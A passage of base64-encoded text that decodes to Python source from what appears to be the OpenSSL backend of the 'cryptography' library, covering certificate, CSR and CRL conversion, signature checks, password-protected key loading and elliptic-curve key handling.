0YV90b19ldnBfcGtleShyc2FfY2RhdGEpXHJcbiAgICAgICAgICAgICAgICByZXR1cm4gX1JTQVB1YmxpY0tleShzZWxmLCByc2FfY2RhdGEsIGV2cF9wa2V5KVxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5faGFuZGxlX2tleV9sb2FkaW5nX2Vycm9yKClcclxuXHJcbiAgICBkZWYgbG9hZF9kZXJfcGFyYW1ldGVycyhzZWxmLCBkYXRhOiBieXRlcykgLT4gZGguREhQYXJhbWV0ZXJzOlxyXG4gICAgICAgIG1lbV9iaW8gPSBzZWxmLl9ieXRlc190b19iaW8oZGF0YSlcclxuICAgICAgICBkaF9jZGF0YSA9IHNlbGYuX2xpYi5kMmlfREhwYXJhbXNfYmlvKG1lbV9iaW8uYmlvLCBzZWxmLl9mZmkuTlVMTClcclxuICAgICAgICBpZiBkaF9jZGF0YSAhPSBzZWxmLl9mZmkuTlVMTDpcclxuICAgICAgICAgICAgZGhfY2RhdGEgPSBzZWxmLl9mZmkuZ2MoZGhfY2RhdGEsIHNlbGYuX2xpYi5ESF9mcmVlKVxyXG4gICAgICAgICAgICByZXR1cm4gX0RIUGFyYW1ldGVycyhzZWxmLCBkaF9jZGF0YSlcclxuICAgICAgICBlbGlmIHNlbGYuX2xpYi5DcnlwdG9ncmFwaHlfSEFTX0VWUF9QS0VZX0RIWDpcclxuICAgICAgICAgICAgIyBXZSBjaGVjayB0byBzZWUgaWYgdGhlIGlzIGRoeC5cclxuICAgICAgICAgICAgc2VsZi5fY29uc3VtZV9lcnJvcnMoKVxyXG4gICAgICAgICAgICByZXMgPSBzZWxmLl9saWIuQklPX3Jlc2V0KG1lbV9iaW8uYmlvKVxyXG4gICAgICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG4gICAgICAgICAgICBkaF9jZGF0YSA9IHNlbGYuX2xpYi5DcnlwdG9ncmFwaHlfZDJpX0RIeHBhcmFtc19iaW8oXHJcbiAgICAgICAgICAgICAgICBtZW1fYmlvLmJpbywgc2VsZi5fZmZpLk5VTExcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICBpZiBkaF9jZGF0YSAhPSBzZWxmLl9mZmkuTlVMTDpcclxuICAgICAgICAgICAgICAgIGRoX2NkYXRhID0gc2VsZi5fZmZpLmdjKGRoX2NkYXRhLCBzZWxmLl9saWIuREhfZnJlZSlcclxuICAgICAgICAgICAgICAgIHJldHVybiBfREhQYXJhbWV0ZXJzKHNlbGYsIGRoX2NkYXRhKVxyXG5cclxuICAgICAgICBzZWxmLl9oYW5kbGVfa2V5X2xvYWRpbmdfZXJyb3IoKVxyXG5cclxuICAgIGRlZiBfY2VydDJvc3NsKHNlbGYsIGNlcnQ6IHg1MDkuQ2VydGlmaWNhdGUpIC0+IHR5cGluZy5Bbnk6XHJcbiAgICAgICAgZGF0YSA9IGNlcnQucHVibGljX2J5dGVzKHNlcmlhbGl6YXRpb24uRW5jb2RpbmcuREVSKVxyXG4gICAgICAgIG1lbV9iaW8gPSBzZWxmLl9ieXRlc190b19iaW8oZGF0YSlcclxuICAgICAgICB4NTA5ID0gc2VsZi5fbGliLmQyaV9YNTA5X2JpbyhtZW1fYmlvLmJpbywgc2VsZi5fZmZpLk5VTEwpXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydCh4NTA5ICE9IHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgIHg1MDkgPSBzZWxmLl9mZmkuZ2MoeDUwOSwgc2VsZi5fbGliLlg1MDlfZnJlZSlcclxuICAgICAgICByZXR1cm4geDUwOVxyXG5cclxuICAgIGRlZiBfb3NzbDJjZXJ0KHNlbGYsIHg1MDk6IHR5cGluZy5BbnkpIC0+IHg1MDkuQ2VydGlmaWNhdGU6XHJcbiAgICAgICAgYmlvID0gc2VsZi5fY3JlYXRlX21lbV9iaW9fZ2MoKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2xpYi5pMmRfWDUwOV9iaW8oYmlvLCB4NTA5KVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgcmV0dXJuIHJ1c3RfeDUwOS5sb2FkX2Rlcl94NTA5X2NlcnRpZmljYXRlKHNlbGYuX3JlYWRfbWVtX2JpbyhiaW8pKVxyXG5cclxuICAgIGRlZiBfY3NyMm9zc2woc2VsZiwgY3NyOiB4NTA5LkNlcnRpZmljYXRlU2lnbmluZ1JlcXVlc3QpIC0+IHR5cGluZy5Bbnk6XHJcbiAgICAgICAgZGF0YSA9IGNzci5wdWJsaWNfYnl0ZXMoc2VyaWFsaXphdGlvbi5FbmNvZGluZy5ERVIpXHJcbiAgICAgICAgbWVtX2JpbyA9IHNlbGYuX2J5dGVzX3RvX2JpbyhkYXRhKVxyXG4gICAgICAgIHg1MDlfcmVxID0gc2VsZi5fbGliLmQyaV9YNTA5X1JFUV9iaW8obWVtX2Jpby5iaW8sIHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQoeDUwOV9yZXEgIT0gc2VsZi5fZmZpLk5VTEwpXHJcbiAgICAgICAgeDUwOV9yZXEgPSBzZWxmLl9mZmkuZ2MoeDUwOV9yZXEsIHNlbGYuX2xpYi5YNTA5X1JFUV9mcmVlKVxyXG4gICAgICAgIHJldHVybiB4NTA5X3JlcVxyXG5cclxuICAgIGRlZiBfb3NzbDJjc3IoXHJcbiAgICAgICAgc2VsZiwgeDUwOV9yZXE6IHR5cGluZy5BbnlcclxuICAgICkgLT4geDUwOS5DZXJ0aWZpY2F0ZVNpZ25pbmdSZXF1ZXN0OlxyXG4gICAgICAgIGJpbyA9IHNlbGYuX2NyZWF0ZV9tZW1fYmlvX2djKClcclxuICAgICAgICByZXMgPSBzZWxmLl9saWIuaTJkX1g1MDlfUkVRX2JpbyhiaW8sIHg1MDlfcmVxKVxyXG4gICAgICAgIHNlbGYub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgcmV0dXJuIHJ1c3RfeDUwOS5sb2FkX2Rlcl94NTA5X2NzcihzZWxmLl9yZWFkX21lbV9iaW8oYmlvKSlcclxuXHJcbiAgICBkZWYgX2NybDJvc3NsKHNlbGYsIGNybDogeDUwOS5DZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0KSAtPiB0eXBpbmcuQW55OlxyXG4gICAgICAgIGRhdGEgPSBjcmwucHVibGljX2J5dGVzKHNlcmlhbGl6YXRpb24uRW5jb2RpbmcuREVSKVxyXG4gICAgICAgIG1lbV9iaW8gPSBzZWxmLl9ieXRlc190b19iaW8oZGF0YSlcclxuICAgICAgICB4NTA5X2NybCA9IHNlbGYuX2xpYi5kMmlfWDUwOV9DUkxfYmlvKG1lbV9iaW8uYmlvLCBzZWxmLl9mZmkuTlVMTClcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KHg1MDlfY3JsICE9IHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgIHg1MDlfY3JsID0gc2VsZi5fZmZpLmdjKHg1MDlfY3JsLCBzZWxmLl9saWIuWDUwOV9DUkxfZnJlZSlcclxuICAgICAgICByZXR1cm4geDUwOV9jcmxcclxuXHJcbiAgICBkZWYgX29zc2wyY3JsKFxyXG4gICAgICAgIHNlbGYsIHg1MDlfY3JsOiB0eXBpbmcuQW55XHJcbiAgICApIC0+IHg1MDkuQ2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdDpcclxuICAgICAgICBiaW8gPSBzZWxmLl9jcmVhdGVfbWVtX2Jpb19nYygpXHJcbiAgICAgICAgcmVzID0gc2VsZi5fbGliLmkyZF9YNTA5X0NSTF9iaW8oYmlvLCB4NTA5X2NybClcclxuICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG4gICAgICAgIHJldHVybiBydXN0X3g1MDkubG9hZF9kZXJfeDUwOV9jcmwoc2VsZi5fcmVhZF9tZW1fYmlvKGJpbykpXHJcblxyXG4gICAgZGVmIF9jcmxfaXNfc2lnbmF0dXJlX3ZhbGlkKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgY3JsOiB4NTA5LkNlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3QsXHJcbiAgICAgICAgcHVibGljX2tleTogQ0VSVElGSUNBVEVfSVNTVUVSX1BVQkxJQ19LRVlfVFlQRVMsXHJcbiAgICApIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoXHJcbiAgICAgICAgICAgIHB1YmxpY19rZXksXHJcbiAgICAgICAgICAgIChcclxuICAgICAgICAgICAgICAgIF9EU0FQdWJsaWNLZXksXHJcbiAgICAgICAgICAgICAgICBfUlNBUHVibGljS2V5LFxyXG4gICAgICAgICAgICAgICAgX0VsbGlwdGljQ3VydmVQdWJsaWNLZXksXHJcbiAgICAgICAgICAgICksXHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIkV4cGVjdGluZyBvbmUgb2YgRFNBUHVibGljS2V5LCBSU0FQdWJsaWNLZXksIlxyXG4gICAgICAgICAgICAgICAgIiBvciBFbGxpcHRpY0N1cnZlUHVibGljS2V5LiJcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIHg1MDlfY3JsID0gc2VsZi5fY3JsMm9zc2woY3JsKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2xpYi5YNTA5X0NSTF92ZXJpZnkoeDUwOV9jcmwsIHB1YmxpY19rZXkuX2V2cF9wa2V5KVxyXG5cclxuICAgICAgICBpZiByZXMgIT0gMTpcclxuICAgICAgICAgICAgc2VsZi5fY29uc3VtZV9lcnJvcnMoKVxyXG4gICAgICAgICAgICByZXR1cm4gRmFsc2VcclxuXHJcbiAgICAgICAgcmV0dXJuIFRydWVcclxuXHJcbiAgICBkZWYgX2Nzcl9pc19zaWduYXR1cmVfdmFsaWQoXHJcbiAgICAgICAgc2VsZiwgY3NyOiB4NTA5LkNlcnRpZmljYXRlU2lnbmluZ1JlcXVlc3RcclxuICAgICkgLT4gYm9vbDpcclxuICAgICAgICB4NTA5X3JlcSA9IHNlbGYuX2NzcjJvc3NsKGNzcilcclxuICAgICAgICBwa2V5ID0gc2VsZi5fbGliLlg1MDlfUkVRX2dldF9wdWJrZXkoeDUwOV9yZXEpXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChwa2V5ICE9IHNlbGYuX2ZmaS5OVUxMKVxyXG4gICAgICAgIHBrZXkgPSBzZWxmLl9mZmkuZ2MocGtleSwgc2VsZi5fbGliLkVWUF9QS0VZX2ZyZWUpXHJcbiAgICAgICAgcmVzID0gc2VsZi5fbGliLlg1MDlfUkVRX3ZlcmlmeSh4NTA5X3JlcSwgcGtleSlcclxuXHJcbiAgICAgICAgaWYgcmVzICE9IDE6XHJcbiAgICAgICAgICAgIHNlbGYuX2NvbnN1bWVfZXJyb3JzKClcclxuICAgICAgICAgICAgcmV0dXJuIEZhbHNlXHJcblxyXG4gICAgICAgIHJldHVybiBUcnVlXHJcblxyXG4gICAgZGVmIF9jaGVja19rZXlzX2NvcnJlc3BvbmQoc2VsZiwga2V5MSwga2V5Mik6XHJcbiAgICAgICAgaWYgc2VsZi5fbGliLkVWUF9QS0VZX2NtcChrZXkxLl9ldnBfcGtleSwga2V5Mi5fZXZwX3BrZXkpICE9IDE6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIktleXMgZG8gbm90IGNvcnJlc3BvbmQiKVxyXG5cclxuICAgIGRlZiBfbG9hZF9rZXkoc2VsZiwgb3BlbnNzbF9yZWFkX2Z1bmMsIGNvbnZlcnRfZnVuYywgZGF0YSwgcGFzc3dvcmQpOlxyXG4gICAgICAgIG1lbV9iaW8gPSBzZWxmLl9ieXRlc190b19iaW8oZGF0YSlcclxuXHJcbiAgICAgICAgdXNlcmRhdGEgPSBzZWxmLl9mZmkubmV3KCJDUllQVE9HUkFQSFlfUEFTU1dPUkRfREFUQSAqIilcclxuICAgICAgICBpZiBwYXNzd29yZCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgdXRpbHMuX2NoZWNrX2J5dGVzbGlrZSgicGFzc3dvcmQiLCBwYXNzd29yZClcclxuICAgICAgICAgICAgcGFzc3dvcmRfcHRyID0gc2VsZi5fZmZpLmZyb21fYnVmZmVyKHBhc3N3b3JkKVxyXG4gICAgICAgICAgICB1c2VyZGF0YS5wYXNzd29yZCA9IHBhc3N3b3JkX3B0clxyXG4gICAgICAgICAgICB1c2VyZGF0YS5sZW5ndGggPSBsZW4ocGFzc3dvcmQpXHJcblxyXG4gICAgICAgIGV2cF9wa2V5ID0gb3BlbnNzbF9yZWFkX2Z1bmMoXHJcbiAgICAgICAgICAgIG1lbV9iaW8uYmlvLFxyXG4gICAgICAgICAgICBzZWxmLl9mZmkuTlVMTCxcclxuICAgICAgICAgICAgc2VsZi5fZmZpLmFkZHJlc3NvZihcclxuICAgICAgICAgICAgICAgIHNlbGYuX2xpYi5fb3JpZ2luYWxfbGliLCAiQ3J5cHRvZ3JhcGh5X3BlbV9wYXNzd29yZF9jYiJcclxuICAgICAgICAgICAgKSxcclxuICAgICAgICAgICAgdXNlcmRhdGEsXHJcbiAgICAgICAgKVxyXG5cclxuICAgICAgICBpZiBldnBfcGtleSA9PSBzZWxmLl9mZmkuTlVMTDpcclxuICAgICAgICAgICAgaWYgdXNlcmRhdGEuZXJyb3IgIT0gMDpcclxuICAgICAgICAgICAgICAgIHNlbGYuX2NvbnN1bWVfZXJyb3JzKClcclxuICAgICAgICAgICAgICAgIGlmIHVzZXJkYXRhLmVycm9yID09IC0xOlxyXG4gICAgICAgICAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAgICAgIlBhc3N3b3JkIHdhcyBub3QgZ2l2ZW4gYnV0IHByaXZhdGUga2V5IGlzIGVuY3J5cHRlZCJcclxuICAgICAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgICAgIGFzc2VydCB1c2VyZGF0YS5lcnJvciA9PSAtMlxyXG4gICAgICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICJQYXNzd29yZHMgbG9uZ2VyIHRoYW4ge30gYnl0ZXMgYXJlIG5vdCBzdXBwb3J0ZWQgIlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAiYnkgdGhpcyBiYWNrZW5kLiIuZm9ybWF0KHVzZXJkYXRhLm1heHNpemUgLSAxKVxyXG4gICAgICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIHNlbGYuX2hhbmRsZV9rZXlfbG9hZGluZ19lcnJvcigpXHJcblxyXG4gICAgICAgICMgSW4gT3BlblNTTCAzLjAuMC1hbHBoYTE1IHRoZXJlIGV4aXN0IHNjZW5hcmlvcyB3aGVyZSB0aGUga2V5IHdpbGxcclxuICAgICAgICAjIHN1Y2Nlc3NmdWxseSBsb2FkIGJ1dCBlcnJvcnMgYXJlIHN0aWxsIHB1dCBvbiB0aGUgc3RhY2suIFRyYWNrZWRcclxuICAgICAgICAjIGFzIGh0dHBzOi8vZ2l0aHViLmNvbS9vcGVuc3NsL29wZW5zc2wvaXNzdWVzLzE0OTk2XHJcbiAgICAgICAgc2VsZi5fY29uc3VtZV9lcnJvcnMoKVxyXG5cclxuICAgICAgICBldnBfcGtleSA9IHNlbGYuX2ZmaS5nYyhldnBfcGtleSwgc2VsZi5fbGliLkVWUF9QS0VZX2ZyZWUpXHJcblxyXG4gICAgICAgIGlmIHBhc3N3b3JkIGlzIG5vdCBOb25lIGFuZCB1c2VyZGF0YS5jYWxsZWQgPT0gMDpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIlBhc3N3b3JkIHdhcyBnaXZlbiBidXQgcHJpdmF0ZSBrZXkgaXMgbm90IGVuY3J5cHRlZC4iXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgYXNzZXJ0IChcclxuICAgICAgICAgICAgcGFzc3dvcmQgaXMgbm90IE5vbmUgYW5kIHVzZXJkYXRhLmNhbGxlZCA9PSAxXHJcbiAgICAgICAgKSBvciBwYXNzd29yZCBpcyBOb25lXHJcblxyXG4gICAgICAgIHJldHVybiBjb252ZXJ0X2Z1bmMoZXZwX3BrZXkpXHJcblxyXG4gICAgZGVmIF9oYW5kbGVfa2V5X2xvYWRpbmdfZXJyb3Ioc2VsZikgLT4gdHlwaW5nLk5vUmV0dXJuOlxyXG4gICAgICAgIGVycm9ycyA9IHNlbGYuX2NvbnN1bWVfZXJyb3JzKClcclxuXHJcbiAgICAgICAgaWYgbm90IGVycm9yczpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICJDb3VsZCBub3QgZGVzZXJpYWxpemUga2V5IGRhdGEuIFRoZSBkYXRhIG1heSBiZSBpbiBhbiAiXHJcbiAgICAgICAgICAgICAgICAiaW5jb3JyZWN0IGZvcm1hdCBvciBpdCBtYXkgYmUgZW5jcnlwdGVkIHdpdGggYW4gdW5zdXBwb3J0ZWQgIlxyXG4gICAgICAgICAgICAgICAgImFsZ29yaXRobS4iXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgZWxpZiAoXHJcbiAgICAgICAgICAgIGVycm9yc1swXS5fbGliX3JlYXNvbl9tYXRjaChcclxuICAgICAgICAgICAgICAgIHNlbGYuX2xpYi5FUlJfTElCX0VWUCwgc2VsZi5fbGliLkVWUF9SX0JBRF9ERUNSWVBUXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICAgICAgb3IgZXJyb3JzWzBdLl9saWJfcmVhc29uX21hdGNoKFxyXG4gICAgICAgICAgICAgICAgc2VsZi5fbGliLkVSUl9MSUJfUEtDUzEyLFxyXG4gICAgICAgICAgICAgICAgc2VsZi5fbGliLlBLQ1MxMl9SX1BLQ1MxMl9DSVBIRVJGSU5BTF9FUlJPUixcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICBvciAoXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9saWIuQ3J5cHRvZ3JhcGh5X0hBU19QUk9WSURFUlNcclxuICAgICAgICAgICAgICAgIGFuZCBlcnJvcnNbMF0uX2xpYl9yZWFzb25fbWF0Y2goXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fbGliLkVSUl9MSUJfUFJPVixcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLl9saWIuUFJPVl9SX0JBRF9ERUNSWVBULFxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiQmFkIGRlY3J5cHQuIEluY29ycmVjdCBwYXNzd29yZD8iKVxyXG5cclxuICAgICAgICBlbGlmIGFueShcclxuICAgICAgICAgICAgZXJyb3IuX2xpYl9yZWFzb25fbWF0Y2goXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9saWIuRVJSX0xJQl9FVlAsXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9saWIuRVZQX1JfVU5TVVBQT1JURURfUFJJVkFURV9LRVlfQUxHT1JJVEhNLFxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgICAgIGZvciBlcnJvciBpbiBlcnJvcnNcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJVbnN1cHBvcnRlZCBwdWJsaWMga2V5IGFsZ29yaXRobS4iKVxyXG5cclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBlcnJvcnNfd2l0aF90ZXh0ID0gYmluZGluZy5fZXJyb3JzX3dpdGhfdGV4dChlcnJvcnMpXHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiQ291bGQgbm90IGRlc2VyaWFsaXplIGtleSBkYXRhLiBUaGUgZGF0YSBtYXkgYmUgaW4gYW4gIlxyXG4gICAgICAgICAgICAgICAgImluY29ycmVjdCBmb3JtYXQsIGl0IG1heSBiZSBlbmNyeXB0ZWQgd2l0aCBhbiB1bnN1cHBvcnRlZCAiXHJcbiAgICAgICAgICAgICAgICAiYWxnb3JpdGhtLCBvciBpdCBtYXkgYmUgYW4gdW5zdXBwb3J0ZWQga2V5IHR5cGUgKGUuZy4gRUMgIlxyXG4gICAgICAgICAgICAgICAgImN1cnZlcyB3aXRoIGV4cGxpY2l0IHBhcmFtZXRlcnMpLiIsXHJcbiAgICAgICAgICAgICAgICBlcnJvcnNfd2l0aF90ZXh0LFxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgZGVmIGVsbGlwdGljX2N1cnZlX3N1cHBvcnRlZChzZWxmLCBjdXJ2ZTogZWMuRWxsaXB0aWNDdXJ2ZSkgLT4gYm9vbDpcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIGN1cnZlX25pZCA9IHNlbGYuX2VsbGlwdGljX2N1cnZlX3RvX25pZChjdXJ2ZSlcclxuICAgICAgICBleGNlcHQgVW5zdXBwb3J0ZWRBbGdvcml0aG06XHJcbiAgICAgICAgICAgIGN1cnZlX25pZCA9IHNlbGYuX2xpYi5OSURfdW5kZWZcclxuXHJcbiAgICAgICAgZ3JvdXAgPSBzZWxmLl9saWIuRUNfR1JPVVBfbmV3X2J5X2N1cnZlX25hbWUoY3VydmVfbmlkKVxyXG5cclxuICAgICAgICBpZiBncm91cCA9PSBzZWxmLl9mZmkuTlVMTDpcclxuICAgICAgICAgICAgc2VsZi5fY29uc3VtZV9lcnJvcnMoKVxyXG4gICAgICAgICAgICByZXR1cm4gRmFsc2VcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBzZWxmLm9wZW5zc2xfYXNzZXJ0KGN1cnZlX25pZCAhPSBzZWxmLl9saWIuTklEX3VuZGVmKVxyXG4gICAgICAgICAgICBzZWxmLl9saWIuRUNfR1JPVVBfZnJlZShncm91cClcclxuICAgICAgICAgICAgcmV0dXJuIFRydWVcclxuXHJcbiAgICBkZWYgZWxsaXB0aWNfY3VydmVfc2lnbmF0dXJlX2FsZ29yaXRobV9zdXBwb3J0ZWQoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBzaWduYXR1cmVfYWxnb3JpdGhtOiBlYy5FbGxpcHRpY0N1cnZlU2lnbmF0dXJlQWxnb3JpdGhtLFxyXG4gICAgICAgIGN1cnZlOiBlYy5FbGxpcHRpY0N1cnZlLFxyXG4gICAgKSAtPiBib29sOlxyXG4gICAgICAgICMgV2Ugb25seSBzdXBwb3J0IEVDRFNBIHJpZ2h0IG5vdy5cclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShzaWduYXR1cmVfYWxnb3JpdGhtLCBlYy5FQ0RTQSk6XHJcbiAgICAgICAgICAgIHJldHVybiBGYWxzZVxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi5lbGxpcHRpY19jdXJ2ZV9zdXBwb3J0ZWQoY3VydmUpXHJcblxyXG4gICAgZGVmIGdlbmVyYXRlX2VsbGlwdGljX2N1cnZlX3ByaXZhdGVfa2V5KFxyXG4gICAgICAgIHNlbGYsIGN1cnZlOiBlYy5FbGxpcHRpY0N1cnZlXHJcbiAgICApIC0+IGVjLkVsbGlwdGljQ3VydmVQcml2YXRlS2V5OlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIEdlbmVyYXRlIGEgbmV3IHByaXZhdGUga2V5IG9uIHRoZSBuYW1lZCBjdXJ2ZS5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICAgICAgaWYgc2VsZi5lbGxpcHRpY19jdXJ2ZV9zdXBwb3J0ZWQoY3VydmUpOlxyXG4gICAgICAgICAgICBlY19jZGF0YSA9IHNlbGYuX2VjX2tleV9uZXdfYnlfY3VydmUoY3VydmUpXHJcblxyXG4gICAgICAgICAgICByZXMgPSBzZWxmLl9saWIuRUNfS0VZX2dlbmVyYXRlX2tleShlY19jZGF0YSlcclxuICAgICAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuXHJcbiAgICAgICAgICAgIGV2cF9wa2V5ID0gc2VsZi5fZWNfY2RhdGFfdG9fZXZwX3BrZXkoZWNfY2RhdGEpXHJcblxyXG4gICAgICAgICAgICByZXR1cm4gX0VsbGlwdGljQ3VydmVQcml2YXRlS2V5KHNlbGYsIGVjX2NkYXRhLCBldnBfcGtleSlcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICByYWlzZSBVbnN1cHBvcnRlZEFsZ29yaXRobShcclxuICAgICAgICAgICAgICAgICJCYWNrZW5kIG9iamVjdCBkb2VzIG5vdCBzdXBwb3J0IHt9LiIuZm9ybWF0KGN1cnZlLm5hbWUpLFxyXG4gICAgICAgICAgICAgICAgX1JlYXNvbnMuVU5TVVBQT1JURURfRUxMSVBUSUNfQ1VSVkUsXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICBkZWYgbG9hZF9lbGxpcHRpY19jdXJ2ZV9wcml2YXRlX251bWJlcnMoXHJcbiAgICAgICAgc2VsZiwgbnVtYmVyczogZWMuRWxsaXB0aWNDdXJ2ZVByaXZhdGVOdW1iZXJzXHJcbiAgICApIC0+IGVjLkVsbGlwdGljQ3VydmVQcml2YXRlS2V5OlxyXG4gICAgICAgIHB1YmxpYyA9IG51bWJlcnMucHVibGljX251bWJlcnNcclxuXHJcbiAgICAgICAgZWNfY2RhdGEgPSBzZWxmLl9lY19rZXlfbmV3X2J5X2N1cnZlKHB1YmxpYy5jdXJ2ZSlcclxuXHJcbiAgICAgICAgcHJpdmF0ZV92YWx1ZSA9IHNlbGYuX2ZmaS5nYyhcclxuICAgICAgICAgICAgc2VsZi5faW50X3RvX2JuKG51bWJlcnMucHJpdmF0ZV92YWx1ZSksIHNlbGYuX2xpYi5CTl9jbGVhcl9mcmVlXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2xpYi5FQ19LRVlfc2V0X3ByaXZhdGVfa2V5KGVjX2NkYXRhLCBwcml2YXRlX3ZhbHVlKVxyXG4gICAgICAgIGlmIHJlcyAhPSAxOlxyXG4gICAgICAgICAgICBzZWxmLl9jb25zdW1lX2Vycm9ycygpXHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkludmFsaWQgRUMga2V5LiIpXHJcblxyXG4gICAgICAgIHNlbGYuX2VjX2tleV9zZXRfcHVibGljX2tleV9hZmZpbmVfY29vcmRpbmF0ZXMoXHJcbiAgICAgICAgICAgIGVjX2NkYXRhLCBwdWJsaWMueCwgcHVibGljLnlcclxuICAgICAgICApXHJcblxyXG4gICAgICAgIGV2cF9wa2V5ID0gc2VsZi5fZWNfY2RhdGFfdG9fZXZwX3BrZXkoZWNfY2RhdGEpXHJcblxyXG4gICAgICAgIHJldHVybiBfRWxsaXB0aWNDdXJ2ZVByaXZhdGVLZXkoc2VsZiwgZWNfY2RhdGEsIGV2cF9wa2V5KVxyXG5cclxuICAgIGRlZiBsb2FkX2VsbGlwdGljX2N1cnZlX3B1YmxpY19udW1iZXJzKFxyXG4gICAgICAgIHNlbGYsIG51bWJlcnM6IGVjLkVsbGlwdGljQ3VydmVQdWJsaWNOdW1iZXJzXHJcbiAgICApIC0+IGVjLkVsbGlwdGljQ3VydmVQdWJsaWNLZXk6XHJcbiAgICAgICAgZWNfY2RhdGEgPSBzZWxmLl9lY19rZXlfbmV3X2J5X2N1cnZlKG51bWJlcnMuY3VydmUpXHJcbiAgICAgICAgc2VsZi5fZWNfa2V5X3NldF9wdWJsaWNfa2V5X2FmZmluZV9jb29yZGluYXRlcyhcclxuICAgICAgICAgICAgZWNfY2RhdGEsIG51bWJlcnMueCwgbnVtYmVycy55XHJcbiAgICAgICAgKVxyXG4gICAgICAgIGV2cF9wa2V5ID0gc2VsZi5fZWNfY2RhdGFfdG9fZXZwX3BrZXkoZWNfY2RhdGEpXHJcblxyXG4gICAgICAgIHJldHVybiBfRWxsaXB0aWNDdXJ2ZVB1YmxpY0tleShzZWxmLCBlY19jZGF0YSwgZXZwX3BrZXkpXHJcblxyXG4gICAgZGVmIGxvYWRfZWxsaXB0aWNfY3VydmVfcHVibGljX2J5dGVzKFxyXG4gICAgICAgIHNlbGYsIGN1cnZlOiBlYy5FbGxpcHRpY0N1cnZlLCBwb2ludF9ieXRlczogYnl0ZXNcclxuICAgICkgLT4gZWMuRWxsaXB0aWNDdXJ2ZVB1YmxpY0tleTpcclxuICAgICAgICBlY19jZGF0YSA9IHNlbGYuX2VjX2tleV9uZXdfYnlfY3VydmUoY3VydmUpXHJcbiAgICAgICAgZ3JvdXAgPSBzZWxmLl9saWIuRUNfS0VZX2dldDBfZ3JvdXAoZWNfY2RhdGEpXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChncm91cCAhPSBzZWxmLl9mZmkuTlVMTClcclxuICAgICAgICBwb2ludCA9IHNlbGYuX2xpYi5FQ19QT0lOVF9uZXcoZ3JvdXApXHJcbiAgICAgICAgc2VsZi5vcGVuc3NsX2Fzc2VydChwb2ludCAhPSBzZWxmLl9mZmkuTlVMTClcclxuICAgICAgICBw